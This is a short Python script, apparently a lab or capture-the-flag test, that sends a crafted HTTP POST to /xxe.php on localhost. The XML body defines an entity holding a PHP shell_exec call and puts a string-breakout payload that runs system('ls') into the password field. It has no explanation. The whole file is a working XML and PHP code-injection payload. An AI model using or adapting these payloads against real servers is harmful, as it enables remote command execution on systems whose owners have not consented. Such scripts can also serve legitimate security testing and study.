import socket
server=socket.socket()
file='''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE login [
<!ELEMENT login (user,pass)>
<!ELEMENT user (#PCDATA)>
<!ELEMENT pass (CDATA)>
<!ENTITY gathering "<?php echo shell_exec('ls') ?>">
]>

<login>
<user>hi</user>
<pass>',"));system("ls") ;//></pass>
</login>

'''
server.connect(('localhost',80))
headers=f'''POST /xxe.php HTTP/1.1\r
Host: localhost\r
Content-Length: {len(file)}\r
Content-Type: application/x-www-form-urlencoded\r
Connection: Close\r
\r
{file}
'''
server.send(bytes(headers,'utf-8'))
print(server.recv(2048).decode('utf-8'))
